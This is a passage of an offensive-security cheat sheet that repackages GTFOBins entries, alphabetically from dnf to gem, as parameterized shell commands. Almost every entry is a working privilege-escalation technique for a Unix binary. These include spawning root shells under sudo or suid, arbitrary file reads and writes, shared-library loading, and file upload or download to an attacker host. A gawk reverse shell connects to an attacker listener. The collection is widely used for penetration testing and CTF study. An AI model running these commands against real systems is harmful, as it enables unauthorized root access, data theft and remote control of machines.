dnf install -y x-1.0-1.noarch.rpm --disablerepo=*
```
<!-- cheat
-->

## dnsmasq

### dnsmasq command

Execute dnsmasq command with the Gtfobins GTFOBins technique.

Execute an arbitrary non-interactive command.

```sh title:"GTFOBins Execute Dnsmasq Command (dnsmasq command (sudo / suid / unprivileged)"
dnsmasq --conf-script='$cmd_file 1>&2'
```
<!-- cheat
var cmd_file
-->

## doas

### doas shell

Spawn doas shell with the Gtfobins GTFOBins technique.

The user must be allowed to use `doas`.

```sh title:"GTFOBins Spawn Doas Shell (doas shell (sudo / unprivileged)"
doas -u root /bin/sh
```
<!-- cheat
-->

## docker

This requires the user to be privileged enough to run `docker`, e.g., being in the `docker` group or being `root`.

### docker shell #1

Spawn docker shell #1 with the Gtfobins GTFOBins technique.

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"GTFOBins Spawn Docker Shell #1 (docker shell (sudo / suid / unprivileged)"
docker run -v /:/mnt --rm -it alpine chroot /mnt /bin/sh
```
<!-- cheat
-->

### docker shell #2

Spawn docker shell #2 with the Gtfobins GTFOBins technique.

This exploits the fact that is run with the `--privileged` option to directly mount a host's disk, e.g., `/dev/sda1`.

```sh title:"GTFOBins Spawn Docker Shell #2 (docker shell (sudo / suid / unprivileged)"
docker run --rm -it --privileged -u root alpine
mount /dev/sda1 /mnt/
ls -la /mnt/
chroot /mnt /bin/bash
```
<!-- cheat
-->

### docker file-read

Read docker file read with the Gtfobins GTFOBins technique.

Read a file by copying it to a temporary container (`$CONTAINER_ID`) and back to a new location on the host.

```sh title:"GTFOBins Read Docker File Read (docker file read (sudo / suid / unprivileged)"
docker cp $file_in $CONTAINER_ID:input-file
docker cp $CONTAINER_ID:input-file $tmp_file
cat $tmp_file
```
<!-- cheat
var file_in
var tmp_file
var CONTAINER_ID
-->

### docker file-write

Write docker file write with the Gtfobins GTFOBins technique.

Write a file by copying it to a temporary container (`$CONTAINER_ID`) and back to the target destination on the host.

```sh title:"GTFOBins Write Docker File Write (docker file write (sudo / suid / unprivileged)"
echo $data >$tmp_file
docker cp $tmp_file $CONTAINER_ID:temp-file
docker cp $CONTAINER_ID $file_out
```
<!-- cheat
var data
var file_out
var tmp_file
var CONTAINER_ID
-->

## dos2unix

### dos2unix file-read

Read dos2unix file read with the Gtfobins GTFOBins technique.

Read the contents of an arbitrary file.

```sh title:"GTFOBins Read Dos2unix File Read (dos2unix file read (sudo / suid / unprivileged)"
dos2unix -f -O $file_in
```
<!-- cheat
var file_in
-->

### dos2unix file-write

Write dos2unix file write with the Gtfobins GTFOBins technique.

Write attacker-controlled data to an arbitrary path.

```sh title:"GTFOBins Write Dos2unix File Write (dos2unix file write (sudo / suid / unprivileged)"
dos2unix -f -n $file_in $file_out
```
<!-- cheat
var file_in
var file_out
-->

## dosbox

Basically `dosbox` allows to mount the local file system, so that it can be altered using DOS commands. Note that the DOS filename convention ([8.3](https://en.wikipedia.org/wiki/8.3_filename)) is used.

### dosbox file-read #1

Read dosbox file read #1 with the Gtfobins GTFOBins technique.

The file content will be displayed in the DOSBox graphical window.

```sh title:"GTFOBins Read Dosbox File Read #1 (dosbox file read (sudo / suid / unprivileged)"
dosbox -c 'mount c /' -c 'type c:\path\to\input'
```
<!-- cheat
-->

### dosbox file-read #2

Read dosbox file read #2 with the Gtfobins GTFOBins technique.

The file is copied to a readable location.

```sh title:"GTFOBins Read Dosbox File Read #2 (dosbox file read (sudo / suid / unprivileged)"
dosbox -c 'mount c /' -c 'copy c:\path\to\input c:\path\to\output' -c exit
cat $file_out
```
<!-- cheat
var file_out
-->

### dosbox file-write

Write dosbox file write with the Gtfobins GTFOBins technique.

Note that `echo` terminates the string with a DOS-style line terminator (`\r\n`), if that's a problem and your scenario allows it, you can create the file outside `dosbox`, then use `copy` to do the actual write.

```sh title:"GTFOBins Write Dosbox File Write (dosbox file write (sudo / suid / unprivileged)"
dosbox -c 'mount c /' -c "echo $data >c:\path\to\output" -c exit
```
<!-- cheat
var data
-->

## dotnet

### dotnet shell

Spawn dotnet shell with the Gtfobins GTFOBins technique.

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"GTFOBins Spawn Dotnet Shell (dotnet shell (sudo / unprivileged)"
dotnet fsi
System.Diagnostics.Process.Start("/bin/sh").WaitForExit();;
```
<!-- cheat
-->

### dotnet file-read

Read dotnet file read with the Gtfobins GTFOBins technique.

Read the contents of an arbitrary file.

```sh title:"GTFOBins Read Dotnet File Read (dotnet file read (sudo / unprivileged)"
dotnet fsi
System.IO.File.ReadAllText("$file_in");;
```
<!-- cheat
var file_in
-->

## dpkg

### dpkg shell

Spawn dpkg shell with the Gtfobins GTFOBins technique.

Generate the Debian package with [fpm](https://github.com/jordansissel/fpm) and upload it to the target.  ``` echo 'exec /bin/sh' >x.sh fpm -n x -s dir -t deb -a all --before-install x.sh . ```

```sh title:"GTFOBins Spawn Dpkg Shell (dpkg shell (sudo)"
dpkg -i x_1.0_all.deb
```
<!-- cheat
-->

### dpkg inherit (inherits from less)

Run dpkg inherit (inherits from less) with the Gtfobins GTFOBins technique.

Inherit the capabilities of another binary by invoking it.

```sh title:"GTFOBins Run Dpkg Inherit (inherits from Less) (dpkg inherit from less (sudo / suid / unprivileged)"
dpkg -l
```
<!-- cheat
-->

## dstat

### dstat inherit (inherits from python)

Run dstat inherit (inherits from python) with the Gtfobins GTFOBins technique.

`dstat` allows you to run arbitrary Python scripts loaded as "external plugins" if they are located in one of the directories, stated in the `dstat` man page under "FILES":  - `~/.dstat/` - `(path of binary)/plugins/` - `/usr/share/dstat/` - `/usr/local/share/dstat/`  Pick the one that you can write into. The plugin named `xxx` file name must be defined in the `dstat_xxx.py` file.

```sh title:"GTFOBins Run Dstat Inherit (inherits from Python) (dstat inherit from python (sudo / unprivileged)"
dstat --xxx
```
<!-- cheat
-->

## dvips

### dvips shell

Spawn dvips shell with the Gtfobins GTFOBins technique.

The `texput.dvi` output file produced by `tex` can be created offline and uploaded to the target.  ``` tex '\special{psfile="`/bin/sh 1>&0"}\end' ```

```sh title:"GTFOBins Spawn Dvips Shell (dvips shell (sudo / suid / unprivileged)"
dvips -R0 texput.dvi
```
<!-- cheat
-->

## easy_install

### easy_install inherit (inherits from python)

Install easy install inherit (inherits from python) with the Gtfobins GTFOBins technique.

This allows to run Python code (`...`). It executes a Python script named `setup.py` in the directory passed as argument (`.`).  Keep in mind that the TTY is lost, so `/dev/tty` can be used, for example:  ``` echo 'import os; os.system("exec /bin/sh </dev/tty >/dev/tty 2>/dev/tty")' >setup.py ```

```sh title:"GTFOBins Install Easy Install Inherit (inherits from Python) (easy_install inherit from python (sudo / unprivileged)"
echo '...' >setup.py
easy_install .
```
<!-- cheat
-->

## easyrsa

### easyrsa shell

Spawn easyrsa shell with the Gtfobins GTFOBins technique.

This command might not be in the `PATH`, it could be found in, `/usr/share/easy-rsa/easyrsa`. The shell is spawn twice.

```sh title:"GTFOBins Spawn Easyrsa Shell (easyrsa shell (sudo / suid / unprivileged)"
echo 'set_var X "$(/bin/sh 1>&0)"' >$tmp_file
easyrsa --vars=$tmp_file
```
<!-- cheat
var tmp_file
-->

## eb

For this to work the target must be connected to an AWS instance via EB CLI.

### eb inherit (inherits from journalctl)

Run eb inherit (inherits from journalctl) with the Gtfobins GTFOBins technique.

Inherit the capabilities of another binary by invoking it.

```sh title:"GTFOBins Run Eb Inherit (inherits from Journalctl) (eb inherit from journalctl (sudo / unprivileged)"
eb logs
```
<!-- cheat
-->

## ed

### ed shell

Spawn ed shell with the Gtfobins GTFOBins technique.

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"GTFOBins Spawn Ed Shell (ed shell (sudo / suid / unprivileged)"
ed
!/bin/sh
q
```
<!-- cheat
-->

### ed file-read

Read ed file read with the Gtfobins GTFOBins technique.

Read the contents of an arbitrary file.

```sh title:"GTFOBins Read Ed File Read (ed file read (sudo / suid / unprivileged)"
ed $file_in
,p
q
```
<!-- cheat
var file_in
-->

### ed file-write

Write ed file write with the Gtfobins GTFOBins technique.

Write attacker-controlled data to an arbitrary path.

```sh title:"GTFOBins Write Ed File Write (ed file write (sudo / suid / unprivileged)"
ed $file_out
a
$data
.
w
q
```
<!-- cheat
var data
var file_out
-->

## efax

### efax file-read

Read efax file read with the Gtfobins GTFOBins technique.

The content is actually parsed by the command.

```sh title:"GTFOBins Read Efax File Read (efax file read (sudo / suid)"
efax -d $file_in
```
<!-- cheat
var file_in
-->

## egrep

### egrep file-read

Read egrep file read with the Gtfobins GTFOBins technique.

Read the contents of an arbitrary file.

```sh title:"GTFOBins Read Egrep File Read (egrep file read (sudo / suid / unprivileged)"
grep '' $file_in
```
<!-- cheat
var file_in
-->

## elvish

### elvish shell

Spawn elvish shell with the Gtfobins GTFOBins technique.

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"GTFOBins Spawn Elvish Shell (elvish shell (sudo / suid / unprivileged)"
elvish
```
<!-- cheat
-->

### elvish file-read

Read elvish file read with the Gtfobins GTFOBins technique.

Read the contents of an arbitrary file.

```sh title:"GTFOBins Read Elvish File Read (elvish file read (sudo / suid / unprivileged)"
elvish -c 'print (slurp <$file_in)'
```
<!-- cheat
var file_in
-->

### elvish file-write

Write elvish file write with the Gtfobins GTFOBins technique.

Write attacker-controlled data to an arbitrary path.

```sh title:"GTFOBins Write Elvish File Write (elvish file write (sudo / suid / unprivileged)"
elvish -c 'print $data >$file_out'
```
<!-- cheat
var data
var file_out
-->

## emacs

All the functions operate in the Emacs terminal interface.

### emacs shell

Spawn emacs shell with the Gtfobins GTFOBins technique.

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"GTFOBins Spawn Emacs Shell (emacs shell (sudo / unprivileged)"
emacs -Q -nw --eval '(term "/bin/sh")'
```
<!-- cheat
-->

### emacs file-read

Read emacs file read with the Gtfobins GTFOBins technique.

Read the contents of an arbitrary file.

```sh title:"GTFOBins Read Emacs File Read (emacs file read (sudo / unprivileged)"
emacs $file_in
```
<!-- cheat
var file_in
-->

### emacs file-write

Write emacs file write with the Gtfobins GTFOBins technique.

Write attacker-controlled data to an arbitrary path.

```sh title:"GTFOBins Write Emacs File Write (emacs file write (sudo / unprivileged)"
emacs $file_out
$data
C-x C-s
```
<!-- cheat
var data
var file_out
-->

## enscript

### enscript shell

Spawn enscript shell with the Gtfobins GTFOBins technique.

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"GTFOBins Spawn Enscript Shell (enscript shell (sudo / suid / unprivileged)"
enscript /dev/null -qo /dev/null -I '/bin/sh >&2'
```
<!-- cheat
-->

## env

### env shell

Spawn env shell with the Gtfobins GTFOBins technique.

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"GTFOBins Spawn Env Shell (env shell (sudo / suid / unprivileged)"
env /bin/sh
```
<!-- cheat
-->

#### env shell - suid override
Spawn env shell with the Gtfobins GTFOBins technique.

```sh title:"GTFOBins Spawn Env Shell (env shell (suid variant)"
env /bin/sh -p
```
<!-- cheat
-->

## eqn

### eqn file-read

Read eqn file read with the Gtfobins GTFOBins technique.

The content is actually parsed and corrupted by the command.

```sh title:"GTFOBins Read Eqn File Read (eqn file read (sudo / suid / unprivileged)"
eqn $file_in
```
<!-- cheat
var file_in
-->

## espeak

### espeak file-read

Read espeak file read with the Gtfobins GTFOBins technique.

The file content appears in the middle of other textual information as phonemes.

```sh title:"GTFOBins Read Espeak File Read (espeak file read (sudo / suid / unprivileged)"
espeak -qXf $file_in
```
<!-- cheat
var file_in
-->

## ex

### ex shell

Spawn ex shell with the Gtfobins GTFOBins technique.

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"GTFOBins Spawn Ex Shell (ex shell (sudo / suid / unprivileged)"
ex -c ':!/bin/sh'
```
<!-- cheat
-->

### ex inherit (inherits from ed)

Run ex inherit (inherits from ed) with the Gtfobins GTFOBins technique.

Inherit the capabilities of another binary by invoking it.

```sh title:"GTFOBins Run Ex Inherit (inherits from Ed) (ex inherit from ed (sudo / suid / unprivileged)"
ex
```
<!-- cheat
-->

## exiftool

### exiftool file-read

Read exiftool file read with the Gtfobins GTFOBins technique.

If the permissions allow it, files are moved (instead of copied) to the destination.

```sh title:"GTFOBins Read Exiftool File Read (exiftool file read (sudo / unprivileged)"
exiftool -filename=$file_out $file_in
cat $file_out
```
<!-- cheat
var file_in
var file_out
-->

### exiftool file-write #1

Write exiftool file write #1 with the Gtfobins GTFOBins technique.

If the permissions allow it, files are moved (instead of copied) to the destination.

```sh title:"GTFOBins Write Exiftool File Write #1 (exiftool file write (sudo / unprivileged)"
exiftool -filename=$file_out $file_in
```
<!-- cheat
var file_in
var file_out
-->

### exiftool file-write #2

Write exiftool file write #2 with the Gtfobins GTFOBins technique.

The output file must exists, either empty or be a supported image file. The content is written amidst other content.

```sh title:"GTFOBins Write Exiftool File Write #2 (exiftool file write (sudo / unprivileged)"
exiftool "-description<=$file_in --filename $file_out
```
<!-- cheat
var file_in
var file_out
-->

### exiftool file-write #3

Write exiftool file write #3 with the Gtfobins GTFOBins technique.

The output file must exists, either empty or be a supported image file. The content is written amidst other content.

```sh title:"GTFOBins Write Exiftool File Write #3 (exiftool file write (sudo / unprivileged)"
exiftool "-description=$data --filename $file_out
```
<!-- cheat
var data
var file_out
-->

### exiftool file-write #4

Write exiftool file write #4 with the Gtfobins GTFOBins technique.

Writes the metadata tags of the input file in textual format to the output.

```sh title:"GTFOBins Write Exiftool File Write #4 (exiftool file write (sudo / unprivileged)"
exiftool -description -W $file_out --filename $file_in
```
<!-- cheat
var file_in
var file_out
-->

### exiftool inherit (inherits from perl)

Run exiftool inherit (inherits from perl) with the Gtfobins GTFOBins technique.

This allows to run Perl code (`...`).

```sh title:"GTFOBins Run Exiftool Inherit (inherits from Perl) (exiftool inherit from perl (sudo / unprivileged)"
exiftool -if '...' /etc/passwd
```
<!-- cheat
-->

## expand

### expand file-read

Read expand file read with the Gtfobins GTFOBins technique.

The read file content is corrupted by replacing tabs with spaces.

```sh title:"GTFOBins Read Expand File Read (expand file read (sudo / suid / unprivileged)"
expand $file_in
```
<!-- cheat
var file_in
-->

## expect

### expect shell

Spawn expect shell with the Gtfobins GTFOBins technique.

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"GTFOBins Spawn Expect Shell (expect shell (sudo / suid / unprivileged)"
expect -c 'spawn /bin/sh;interact'
```
<!-- cheat
-->

#### expect shell - suid override
Spawn expect shell with the Gtfobins GTFOBins technique.

```sh title:"GTFOBins Spawn Expect Shell (expect shell (suid variant)"
expect -c 'spawn /bin/sh -p;interact'
```
<!-- cheat
-->

### expect file-read

Read expect file read with the Gtfobins GTFOBins technique.

The file is read and parsed as an `expect` command file, the content of the first invalid line is returned in an error message.

```sh title:"GTFOBins Read Expect File Read (expect file read (sudo / suid / unprivileged)"
expect $file_in
```
<!-- cheat
var file_in
-->

## facter

### facter inherit #1 (inherits from ruby)

Run facter inherit #1 (inherits from ruby) with the Gtfobins GTFOBins technique.

The first `.rb` file in the `$dir/` directory will be executed.

```sh title:"GTFOBins Run Facter Inherit #1 (inherits from Ruby) (facter inherit #1 inherit from ruby (sudo / unprivileged)"
FACTERLIB=$dir/ facter
```
<!-- cheat
var dir
-->

### facter inherit #2 (inherits from ruby)

Run facter inherit #2 (inherits from ruby) with the Gtfobins GTFOBins technique.

The first `.rb` file in the `$dir/` directory will be executed.

```sh title:"GTFOBins Run Facter Inherit #2 (inherits from Ruby) (facter inherit #2 inherit from ruby (sudo / unprivileged)"
facter --custom-dir=$dir/ x
```
<!-- cheat
var dir
-->

## fail2ban-client

### fail2ban-client command #1

Execute fail2ban client command #1 with the Gtfobins GTFOBins technique.

The subprocess is immediately sent to the background, but `fail2ban-client` waits on a return code from the subprocess. The `banip` command will hang until the subprocess returns.

```sh title:"GTFOBins Execute Fail2ban Client Command #1 (fail2ban-client command (sudo)"
fail2ban-client add x
fail2ban-client set x addaction x
fail2ban-client set x action x actionban $cmd_file
fail2ban-client start x
fail2ban-client set x banip 999.999.999.999
fail2ban-client set x unbanip 999.999.999.999
fail2ban-client stop x
```
<!-- cheat
var cmd_file
-->

### fail2ban-client command #2

Execute fail2ban client command #2 with the Gtfobins GTFOBins technique.

Execute an arbitrary non-interactive command.

```sh title:"GTFOBins Execute Fail2ban Client Command #2 (fail2ban-client command (sudo)"
cat >$tmp_dir/fail2ban.conf <<EOF
[Definition]
EOF

cat >$tmp_dir/jail.local <<EOF
[x]
enabled = true
action = x
EOF

mkdir -p $tmp_dir/action.d/
cat >$tmp_dir/action.d/x.conf <<EOF
[Definition]
actionstart = $cmd_file
EOF

mkdir -p $tmp_dir/filter.d/
cat >$tmp_dir/filter.d/x.conf <<EOF
[Definition]
EOF

fail2ban-client -c $tmp_dir/ -v restart
```
<!-- cheat
var cmd_file
var tmp_dir
-->

## fastfetch

### fastfetch shell

Spawn fastfetch shell with the Gtfobins GTFOBins technique.

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"GTFOBins Spawn Fastfetch Shell (fastfetch shell (sudo / suid / unprivileged)"
echo '{"modules":[{"type":"command","key":"x","text":"exec /bin/sh 1>&0 2>&0"}]}' >$tmp_file
fastfetch -c $tmp_file
```
<!-- cheat
var tmp_file
-->

### fastfetch command

Execute fastfetch command with the Gtfobins GTFOBins technique.

Execute an arbitrary non-interactive command.

```sh title:"GTFOBins Execute Fastfetch Command (fastfetch command (sudo / suid / unprivileged)"
echo '{"modules":[{"type":"command","key":"x","text":"exec $cmd_file"}]}' >$tmp_file
fastfetch -c $tmp_file
```
<!-- cheat
var cmd_file
var tmp_file
-->

### fastfetch file-read

Read fastfetch file read with the Gtfobins GTFOBins technique.

The file content is used as the logo while some other information is displayed on its right.

```sh title:"GTFOBins Read Fastfetch File Read (fastfetch file read (sudo / suid / unprivileged)"
fastfetch --file $file_in
```
<!-- cheat
var file_in
-->

## ffmpeg

### ffmpeg library-load

Run ffmpeg library load with the Gtfobins GTFOBins technique.

Load an attacker-supplied shared library.

```sh title:"GTFOBins Run Ffmpeg Library Load (ffmpeg library load (sudo / suid / unprivileged)"
ffmpeg -f lavfi -i anullsrc -af ladspa=file=$lib $tmp_file
reset^J
```
<!-- cheat
var lib
var tmp_file
-->

## fgrep

### fgrep file-read

Read fgrep file read with the Gtfobins GTFOBins technique.

Read the contents of an arbitrary file.

```sh title:"GTFOBins Read Fgrep File Read (fgrep file read (sudo / suid / unprivileged)"
grep '' $file_in
```
<!-- cheat
var file_in
-->

## file

### file file-read #1

Read file file read #1 with the Gtfobins GTFOBins technique.

Each input line is treated as a filename for the `file` command and the output is corrupted by a suffix `:` followed by the result or the error of the operation.

```sh title:"GTFOBins Read File File Read #1 (file file read (sudo / suid / unprivileged)"
file -f $file_in
```
<!-- cheat
var file_in
-->

### file file-read #2

Read file file read #2 with the Gtfobins GTFOBins technique.

Each line is corrupted by a prefix string and wrapped inside quotes.  If a line in the target file begins with a `#`, it will not be printed as these lines are parsed as comments.  It can also be provided with a directory and will read each file in the directory.

```sh title:"GTFOBins Read File File Read #2 (file file read (sudo / suid / unprivileged)"
file -m $file_in
```
<!-- cheat
var file_in
-->

## find

### find shell

Find shell with the Gtfobins GTFOBins technique.

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"GTFOBins Find Shell (find shell (sudo / suid / unprivileged)"
find . -exec /bin/sh \; -quit
```
<!-- cheat
-->

#### find shell - suid override
Find shell with the Gtfobins GTFOBins technique.

```sh title:"GTFOBins Find Shell (find shell (suid variant)"
find . -exec /bin/sh -p \; -quit
```
<!-- cheat
-->

### find file-read

Find file read with the Gtfobins GTFOBins technique.

This uses `cat` to actually read the file, but since permissions are not dropped, it's executed with the same privileges as `find`.

```sh title:"GTFOBins Find File Read (find file read (sudo / suid / unprivileged)"
find $file_in -exec cat {} \;
```
<!-- cheat
var file_in
-->

### find file-write

Find file write with the Gtfobins GTFOBins technique.

`$data` is a format string, it supports some escape sequences.

```sh title:"GTFOBins Find File Write (find file write (sudo / suid / unprivileged)"
find / -fprintf $file_out $data -quit
```
<!-- cheat
var data
var file_out
-->

## finger

### finger download

Download finger download with the Gtfobins GTFOBins technique.

The command hangs waiting for the remote peer to close the socket.

```sh title:"GTFOBins Download Finger Download (finger download (sudo / suid / unprivileged)"
finger x@$lhost
```
<!-- cheat
import tun_ip
-->

### finger upload

Upload finger upload with the Gtfobins GTFOBins technique.

The command hangs waiting for the remote peer to close the socket.

```sh title:"GTFOBins Upload Finger Upload (finger upload (sudo / suid / unprivileged)"
finger $data@$lhost
```
<!-- cheat
import tun_ip
var data
-->

## firejail

### firejail shell

Spawn firejail shell with the Gtfobins GTFOBins technique.

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"GTFOBins Spawn Firejail Shell (firejail shell (sudo / unprivileged)"
firejail /bin/sh
```
<!-- cheat
-->

## fish

### fish shell

Spawn fish shell with the Gtfobins GTFOBins technique.

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"GTFOBins Spawn Fish Shell (fish shell (sudo / suid / unprivileged)"
fish
```
<!-- cheat
-->

## flock

### flock shell

Spawn flock shell with the Gtfobins GTFOBins technique.

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"GTFOBins Spawn Flock Shell (flock shell (sudo / suid / unprivileged)"
flock -u / /bin/sh
```
<!-- cheat
-->

#### flock shell - suid override
Spawn flock shell with the Gtfobins GTFOBins technique.

```sh title:"GTFOBins Spawn Flock Shell (flock shell (suid variant)"
flock -u / /bin/sh -p
```
<!-- cheat
-->

## fmt

### fmt file-read #1

Read fmt file read #1 with the Gtfobins GTFOBins technique.

Read the contents of an arbitrary file.

```sh title:"GTFOBins Read Fmt File Read #1 (fmt file read (sudo / suid / unprivileged)"
fmt -pNON_EXISTING_PREFIX $file_in
```
<!-- cheat
var file_in
-->

### fmt file-read #2

Read fmt file read #2 with the Gtfobins GTFOBins technique.

This corrupts the output by wrapping very long lines at the given width (`999`).

```sh title:"GTFOBins Read Fmt File Read #2 (fmt file read (sudo / suid / unprivileged)"
fmt -999 $file_in
```
<!-- cheat
var file_in
-->

## fold

### fold file-read

Read fold file read with the Gtfobins GTFOBins technique.

This corrupts the output by wrapping very long lines at the given width (`999`).

```sh title:"GTFOBins Read Fold File Read (fold file read (sudo / suid / unprivileged)"
fold -w999 $file_in
```
<!-- cheat
var file_in
-->

## forge

### forge shell

Spawn forge shell with the Gtfobins GTFOBins technique.

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"GTFOBins Spawn Forge Shell (forge shell (sudo / suid / unprivileged)"
echo '#!/bin/sh' >$tmp_file
echo -e "/bin/sh <$(tty) >$(tty) 2>$(tty)" >>$tmp_file
chmod +x $tmp_file
forge build --use $tmp_file
```
<!-- cheat
var tmp_file
-->

## fping

### fping file-read

Read fping file read with the Gtfobins GTFOBins technique.

Each line is treated as an hostname and it's leaked as an error message.

```sh title:"GTFOBins Read Fping File Read (fping file read (sudo / suid / unprivileged)"
fping -f $file_in
```
<!-- cheat
var file_in
-->

## ftp

### ftp shell

Spawn ftp shell with the Gtfobins GTFOBins technique.

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"GTFOBins Spawn Ftp Shell (ftp shell (sudo / suid / unprivileged)"
ftp
!/bin/sh
```
<!-- cheat
-->

### ftp download

Download ftp download with the Gtfobins GTFOBins technique.

Instead of `-a`, credentials can be supplied via the `user:password@host` connection string.

```sh title:"GTFOBins Download Ftp Download (ftp download (sudo / suid / unprivileged)"
ftp -a $lhost
get $file_in output-file
```
<!-- cheat
import tun_ip
var file_in
-->

### ftp upload

Upload ftp upload with the Gtfobins GTFOBins technique.

Instead of `-a`, credentials can be supplied via the `user:password@host` connection string.

```sh title:"GTFOBins Upload Ftp Upload (ftp upload (sudo / suid / unprivileged)"
ftp -a $lhost
put $file_in output-file
```
<!-- cheat
import tun_ip
var file_in
-->

## fzf

### fzf shell

Spawn fzf shell with the Gtfobins GTFOBins technique.

Press `Enter` to receive the shell.

```sh title:"GTFOBins Spawn Fzf Shell (fzf shell (sudo / suid / unprivileged)"
fzf --bind 'enter:execute(/bin/sh)'
```
<!-- cheat
-->

### fzf command

Execute fzf command with the Gtfobins GTFOBins technique.

Commands can be issued via POST requests, for example:  ``` curl http://localhost:$lport -d 'execute($cmd_file)' ```

```sh title:"GTFOBins Execute Fzf Command (fzf command (sudo / suid / unprivileged)"
fzf --listen=$lport
```
<!-- cheat
import lports
-->

## g++

Alias of [gcc](#gcc). All techniques from `gcc` apply.

## gawk

### gawk shell

Spawn gawk shell with the Gtfobins GTFOBins technique.

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"GTFOBins Spawn Gawk Shell (gawk shell (sudo / suid / unprivileged)"
gawk 'BEGIN {system("/bin/sh")}'
```
<!-- cheat
-->

### gawk reverse-shell

Start gawk reverse shell with the Gtfobins GTFOBins technique.

Connect back to an attacker-controlled listener.

```sh title:"GTFOBins Start Gawk Reverse Shell (gawk reverse shell (sudo / suid / unprivileged)"
gawk 'BEGIN {
    s = "/inet/tcp/0/$lhost/$lport";
    while (1) {printf "> " |& s; if ((s |& getline c) <= 0) break;
    while (c && (c |& getline) > 0) print $0 |& s; close(c)}}'
```
<!-- cheat
import tun_ip
import lports
-->

### gawk bind-shell

Start gawk bind shell with the Gtfobins GTFOBins technique.

Bind a shell to a local port for the attacker to connect to.

```sh title:"GTFOBins Start Gawk Bind Shell (gawk bind shell (sudo / suid / unprivileged)"
gawk 'BEGIN {
    s = "/inet/tcp/$lport/0/0";
    while (1) {printf "> " |& s; if ((s |& getline c) <= 0) break;
    while (c && (c |& getline) > 0) print $0 |& s; close(c)}}'
```
<!-- cheat
import lports
-->

### gawk file-read

Read gawk file read with the Gtfobins GTFOBins technique.

Read the contents of an arbitrary file.

```sh title:"GTFOBins Read Gawk File Read (gawk file read (sudo / suid / unprivileged)"
gawk '//' $file_in
```
<!-- cheat
var file_in
-->

### gawk file-write

Write gawk file write with the Gtfobins GTFOBins technique.

Write attacker-controlled data to an arbitrary path.

```sh title:"GTFOBins Write Gawk File Write (gawk file write (sudo / suid / unprivileged)"
gawk 'BEGIN { print "$data" > "$file_out" }'
```
<!-- cheat
var data
var file_out
-->

## gcc

### gcc shell

Spawn gcc shell with the Gtfobins GTFOBins technique.

In some older versions, the `x` argument must instead reference any existing file.

```sh title:"GTFOBins Spawn Gcc Shell (gcc shell (sudo / unprivileged)"
gcc -wrapper /bin/sh,-s x
```
<!-- cheat
-->

### gcc file-read #1

Read gcc file read #1 with the Gtfobins GTFOBins technique.

Read the contents of an arbitrary file.

```sh title:"GTFOBins Read Gcc File Read #1 (gcc file read (sudo / unprivileged)"
gcc -x c -E $file_in
```
<!-- cheat
var file_in
-->

### gcc file-read #2

Read gcc file read #2 with the Gtfobins GTFOBins technique.

The file is read and parsed as a list of files (one per line), the content is displayed as error messages.

```sh title:"GTFOBins Read Gcc File Read #2 (gcc file read (sudo / unprivileged)"
gcc @$file_in
```
<!-- cheat
var file_in
-->

### gcc file-write

Write gcc file write with the Gtfobins GTFOBins technique.

This actually deletes the file.

```sh title:"GTFOBins Write Gcc File Write (gcc file write (sudo / unprivileged)"
gcc -x c /dev/null -o $file_in
```
<!-- cheat
var file_in
-->

## gcloud

### gcloud inherit (inherits from less)

Run gcloud inherit (inherits from less) with the Gtfobins GTFOBins technique.

Inherit the capabilities of another binary by invoking it.

```sh title:"GTFOBins Run Gcloud Inherit (inherits from Less) (gcloud inherit from less (sudo / suid / unprivileged)"
gcloud help
```
<!-- cheat
-->

## gcore

### gcore file-read

Read gcore file read with the Gtfobins GTFOBins technique.

It can be used to generate core dumps of running processes (`$PID`). Such files often contains sensitive information such as open files content, cryptographic keys, passwords, etc. This command produces a binary file named `core.$PID`, that is then often filtered with `strings` to narrow down relevant information.

```sh title:"GTFOBins Read Gcore File Read (gcore file read (sudo / suid / unprivileged)"
gcore $PID
```
<!-- cheat
var PID
-->

## gdb

### gdb shell

Spawn gdb shell with the Gtfobins GTFOBins technique.

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"GTFOBins Spawn Gdb Shell (gdb shell (capabilities / sudo / suid / unprivileged)"
gdb -nx -ex '!/bin/sh' -ex quit
```
<!-- cheat
-->

#### gdb shell - capabilities override
Spawn gdb shell with the Gtfobins GTFOBins technique.

```sh title:"GTFOBins Spawn Gdb Shell (gdb shell (capabilities variant)"
gdb -nx -ex 'python import os; os.setuid(0)' -ex '!/bin/sh' -ex quit
```
<!-- cheat
-->

### gdb file-write

Write gdb file write with the Gtfobins GTFOBins technique.

Write attacker-controlled data to an arbitrary path.

```sh title:"GTFOBins Write Gdb File Write (gdb file write (sudo / suid / unprivileged)"
gdb -nx -ex 'dump value $file_out "$data"' -ex quit
```
<!-- cheat
var data
var file_out
-->

### gdb inherit (inherits from python)

Run gdb inherit (inherits from python) with the Gtfobins GTFOBins technique.

This allows to run Python code (`...`).

```sh title:"GTFOBins Run Gdb Inherit (inherits from Python) (gdb inherit from python (sudo / suid / unprivileged)"
gdb -nx -ex 'python ...' -ex quit
```
<!-- cheat
-->

## gem

### gem shell

Spawn gem shell with the Gtfobins GTFOBins technique.

This requires the name of an installed gem to be provided, e.g., `debug` is usually installed.

```sh title:"GTFOBins Spawn Gem Shell (gem shell (sudo / unprivileged)"
gem open -e '/bin/sh -s' debug
```
<!-- cheat
-->

### gem inherit #1 (inherits from vi)

Run gem inherit #1 (inherits from vi) with the Gtfobins GTFOBins technique.

This requires the name of an installed gem to be provided, e.g., `debug` is usually installed.

```sh title:"GTFOBins Run Gem Inherit #1 (inherits from Vi) (gem inherit #1 inherit from vi (sudo / unprivileged)"
gem open debug
```
<!-- cheat
-->

